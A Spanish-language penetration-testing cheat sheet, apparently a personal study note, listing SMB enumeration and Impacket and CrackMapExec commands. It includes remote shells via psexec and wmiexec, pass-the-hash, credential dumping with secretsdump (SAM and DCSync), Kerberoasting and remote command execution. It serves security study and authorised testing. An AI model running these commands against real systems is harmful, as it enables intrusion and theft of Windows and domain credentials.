# SMB / Impacket — Cheat Sheet

> Enumeración y explotación SMB/Windows.

---

## SMB (smbclient)

```bash
smbclient -L //<host>              # Listar shares
smbclient //<host>/<share>         # Conectar a share
smbclient //<host>/<share> -U <user>  # Con usuario
smbclient //<host>/<share> -N      # Anónimo
```

## Enumeración SMB

```bash
enum4linux -a <host>               # Enumeración completa
enum4linux -u <user> -p <pass> <host>
smbmap -H <host>                   # Listar shares
smbmap -H <host> -u <user> -p <pass> -R  # Recursivo
```

## Impacket

### SMB

```bash
# Listar shares
smbclient.py <user>:<pass>@<host>

# Ejecutar comandos
smbclient.py <user>:<pass>@<host> -c "dir"

# Upload/Download
smbclient.py <user>:<pass>@<host> -c "put local_file; get remote_file"
```

### Psexec

```bash
# Shell como usuario
psexec.py <user>:<pass>@<host>

# Con hashes (pass-the-hash)
psexec.py <user>@<host> -hashes :<NTLM>
```

### WMIExec

```bash
wmiexec.py <user>:<pass>@<host> "whoami"
wmiexec.py <user>@<host> -hashes :<NTLM> "whoami"
```

### Secretsdump

```bash
# Dump hashes
secretsdump.py <user>:<pass>@<host>
secretsdump.py <user>@<host> -hashes :<NTLM>

# SAM local
secretsdump.py -sam SAM -system SYSTEM LOCAL

# DCSync
secretsdump.py <domain>/<user>:<pass>@<dc_ip> -just-dc
```

### Kerberoasting

```bash
GetUserSPNs.py <domain>/<user>:<pass> -dc-host <dc_ip> -request
```

### Pass-the-Hash

```bash
psexec.py <user>@<host> -hashes :<NTLM>
wmiexec.py <user>@<host> -hashes :<NTLM>
smbexec.py <user>@<host> -hashes :<NTLM>
```

## CrackMapExec (NetExec)

```bash
# SMB
crackmapexec smb <host> -u <user> -p <pass>
crackmapexec smb <host> -u <user> -H <NTLM>

# Share listing
crackmapexec smb <host> -u <user> -p <pass> --shares

# Command execution
crackmapexec smb <host> -u <user> -p <pass> -x "whoami"

# SSH
crackmapexec ssh <host> -u <user> -p <pass>

# WinRM
crackmapexec winrm <host> -u <user> -p <pass>
```







---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes evolve/BLOQUE 8.md|BLOQUE 8]] — Linux, Redes, SMB / Impacket
- [[../../comandos/SMB_Impacket.md|SMB_Impacket]] — Linux, Redes, SMB / Impacket
- [[Tmux.md|Tmux]] — Linux, Redes, Tmux
- [[Windows.md|Windows]] — Linux, Redes, Tmux
- [[../../apuntes evolve/BLOQUE 10.md|BLOQUE 10]] — Linux, Redes, Tmux
- [[../../apuntes Joselu/MODULO3/resumen_master_clase51.md|resumen_master_clase51]] — Linux, Redes, Tmux

### 🛠️ Herramientas

- [[comandos/SMB_Impacket|SMB / Impacket]]
- [[comandos/Tmux|Tmux]]

> #linux #pentest #redes #smb-impacket #tmux #windows
